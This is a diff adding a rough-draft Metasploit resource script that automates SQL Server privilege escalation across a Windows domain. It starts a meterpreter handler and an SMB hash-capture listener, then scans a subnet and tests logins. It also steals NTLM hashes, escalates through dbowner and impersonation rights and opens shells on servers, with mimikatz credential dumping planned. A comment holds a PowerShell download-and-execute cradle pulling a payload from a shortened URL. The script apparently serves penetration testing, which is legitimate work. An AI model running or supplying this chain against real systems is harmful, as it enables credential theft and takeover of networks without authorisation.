@@ -1,0 +1,320 @@
+#################################################
+# SQL Server - Domain User Privilege Escalation #
+#################################################
+# Super rough draft outline
+# References:
+# http://www.offensive-security.com/metasploit-unleashed/Using_the_Database
+# https://www.trustedsec.com/august-2014/metasploit-scripting/
+# https://github.com/rapid7/metasploit-framework/blob/master/scripts/resource/auto_cred_checker.rc
+
+# todo
+# add check to determine which payload method should be used based on fileexist function
+# use alternative obfuscated payload if using exe
+# set payloads to load in background
+# set auto run for mimikatz and hashes, autosysteminfo, autorunscript
+# at end check creds for da
+# add auto generate a del for auto run script
+# setup variables for global settings
+
+# Windows resource
+# resource z:\\Pentest\\dbtest.rc 
+
+# Linux resource
+# resouce /pentest/dbtest.rc
+
+# clear databases
+hosts -d
+creds -d
+services -d
+
+# Start logging - linux - logging
+# spool /tmp/sql_server_escalation_log-test.txt 
+
+# Start logging - windows - logging
+spool c:\\temp\\sql-esc-log1.txt #windows
+
+
+#---------------------------------
+# start handler
+#---------------------------------
+use multi/handler
+setg payload windows/meterpreter/tcp
+set exitonsession false
+setg lport 2387
+setg lhost 0.0.0.0
+exploit -j -z
+
+
+#---------------------------------
+# start smb listener (can use repsonder as alternative)
+#---------------------------------
+use auxiliary/server/capture/smb
+set cainpwfile /tmp/cain_smb_pw
+set johnpwfile /tmp/john_smb_pw
+xploit
+
+
+#---------------------------------
+# List SQL Servers via SPN dump
+#---------------------------------
+# write auxiliary to hit ldap for domain with provided creds 
+# in the mean time use the powershell script
+# Get-SqlServer-Escalate-CheckAccess -DomainController 10.2.9.100 -ListOnly -Credential demo\administrator | 
+# select server | 
+# Export-Csv c:\temp\sql-spn.txt -NoTypeInformation
+
+
+#---------------------------------
+# Determine live SQL Servers via mssql_ping - SPN
+#---------------------------------
+use auxiliary/scanner/mssql/mssql_ping
+set rhosts file:z:\\pentest\\sql-spn.txt
+#set rhosts file:///pentest/sql-spn.txt 
+set threads 255
+exploit
+
+
+#---------------------------------
+# Determine live SQL Servers via mssql_ping - network
+# Use case 1: unauthenticated enumeration of servers
+# Use case 2: finding servers that are not on the domain
+# This doesn't seem to cause duplicate entries in the services database
+#---------------------------------
+use auxiliary/scanner/mssql/mssql_ping
+set rhosts 10.2.9.0/24
+set threads 255
+exploit
+
+
+#---------------------------------
+# Test access to SQL Servers via MSSQL_Login
+#---------------------------------
+use auxiliary/scanner/mssql/mssql_login
+set USERNAME [username]
+set PASSWORD [Password]
+set USE_WINDOWS_AUTHENT true
+set VERBOSE false
+set THREADS 255
+ 
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mssql" and service.state == "open"
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("run")
+    end
+  end
+end
+</ruby>
+
+#---------------------------------
+# Define custom query with mssql_sql - grab server info
+# add service account
+# stuff can be parsed and manually added 
+# to the comments field in the services db
+# uses methods found in the mssql_ping.rb
+#---------------------------------
+use auxiliary/admin/mssql/mssql_sql
+set USERNAME [Username]
+set PASSWORD [Password]
+#domain
+# select 'server: '  + @@servername + ',sysadmin: ' + cast(IS_SRVROLEMEMBER('sysadmin') as varchar(10)) + ',links: ' + (select cast((select count(srvname) from master..sysservers) as varchar(10))) + ',clustered: ' + (select cast(SERVERPROPERTY('IsClustered') as varchar(10)))
+set sql select \'server: \'  + @@servername + \',sysadmin: \' + cast(IS_SRVROLEMEMBER(\'sysadmin\') as varchar(10)) + \',links: \' + (select cast((select count(srvname) from master..sysservers) as varchar(10))) + \',clustered: \' + (select cast(SERVERPROPERTY(\'IsClustered\') as varchar(10))) as OUTPUT
+set USE_WINDOWS_AUTHENT true
+set VERBOSE false
+set THREADS 255
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mssql" and service.state == "open"
+		framework.db.creds.each do |creds|
+			if service.id == creds.service_id
+				self.run_single("set RHOST #{host.address}")
+				self.run_single("set RPORT #{service.port}")
+				self.run_single("run")
+			end
+
+		end
+    end
+  end
+end
+</ruby>
+
+
+#---------------------------------
+# Capture NTLM hashes for service accounts via mssql_ntlm_stealer
+#---------------------------------
+use auxiliary/admin/mssql/mssql_ntlm_stealer
+set USERNAME [Username]
+set PASSWORD [Password]
+#domain
+set USE_WINDOWS_AUTHENT true
+set VERBOSE false
+set THREADS 255
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mssql" and service.state == "open"
+		framework.db.creds.each do |creds|
+			if service.id == creds.service_id
+				self.run_single("set RHOSTS #{host.address}")
+				self.run_single("set RPORT #{service.port}")
+				self.run_single("run")
+			end
+
+		end
+    end
+  end
+end
+</ruby>
+
+
+#---------------------------------
+# Test escalation with db owner configuration
+#---------------------------------
+use auxiliary/admin/mssql/mssql_escalate_dbowner
+set USERNAME [Username]
+set PASSWORD [Password]
+#domain
+set USE_WINDOWS_AUTHENT true
+set VERBOSE false
+set THREADS 255
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mssql" and service.state == "open"
+		framework.db.creds.each do |creds|
+			if service.id == creds.service_id
+				self.run_single("set RHOST #{host.address}")
+				self.run_single("set RPORT #{service.port}")
+				self.run_single("run")
+			end
+
+		end
+    end
+  end
+end
+</ruby>
+
+
+#---------------------------------
+# Test escalation via excessive IMPERSIONATE privs
+#---------------------------------
+use auxiliary/admin/mssql/mssql_escalate_executeas
+set USERNAME [Username]
+set PASSWORD [Password]
+#domain
+set USE_WINDOWS_AUTHENT true
+set VERBOSE false
+set THREADS 255
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mssql" and service.state == "open"
+		framework.db.creds.each do |creds|
+			if service.id == creds.service_id
+				self.run_single("set RHOST #{host.address}")
+				self.run_single("set RPORT #{service.port}")
+				self.run_single("run")
+			end
+
+		end
+    end
+  end
+end
+</ruby>
+
+
+#---------------------------------
+# Test escalation through database links
+#---------------------------------
+# add mssql_linkcrawler
+
+#---------------------------------
+# Test for sysadmin access with MSSQL_payload - traditional shell
+# may want to do use auxiliary/admin/mssql/mssql_exec instead to avoid 
+# av on systems that dont have ps
+#---------------------------------
+use exploit/windows/mssql/mssql_payload
+set PrependMigrate true
+# set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/bind_tcp
+#set autorunscript z:\\pentest\\msf-autorun.txt
+set AutoRunScript C:/metasploit/apps/pro/msf3/scripts/meterpreter/test.rb
+#set AutoRunScript  yourScript     ( yourScript.rb is a ruby script in the /opt/metasploit/msf3/scripts/meterpreter dir and does getsystem, migrate,etcat  victim end)
+#create autorunscript
+#sysinfo
+#getuid
+#getsystem
+#getuid
+#load mimikatz
+#create 64 bit process and migrate in
+#wdigest
+set lport 12345
+set USERNAME [Username]
+set PASSWORD [Password]
+#domain
+set USE_WINDOWS_AUTHENT true
+set VERBOSE false
+set THREADS 255
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "mssql" and service.state == "open"
+		framework.db.creds.each do |creds|
+			if service.id == creds.service_id
+				self.run_single("set RHOST #{host.address}")
+				self.run_single("set RPORT #{service.port}")
+				self.run_single("run")
+			end
+
+		end
+    end
+  end
+end
+</ruby>
+
+
+#---------------------------------
+# Define custom query with mssql_sql - shell through powershell reflection 
+# * use if powershell exist, testing with fileexist - add check to determine which to use
+#---------------------------------
+# use ps_webshell to generate payload in poewrshell format
+# place on web server
+# enable xp cmdshell,then execute command below via xp_cmdshell
+# powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
+
+
+#---------------------------------
+# Get list of domain admins
+#---------------------------------
+# write auxiliary to hit ldap for domain with provided creds
+
+
+#---------------------------------
+# Check list of creds for domain admins
+#---------------------------------
+
+# if no data check for new creds, if new creds get list of active sessions from dc/files servers, attempt psexec mimikatz / hash
+# then check again
+
+# print domain admins and passwords / hashes
+
+# export the live sql server instances
+# services -s mssql -u -o /root/msfu/http.csv
+
+# export the creds
+# creds -o c:\\temp\\msf-creds.txt
+
+
+
+
+
+
+
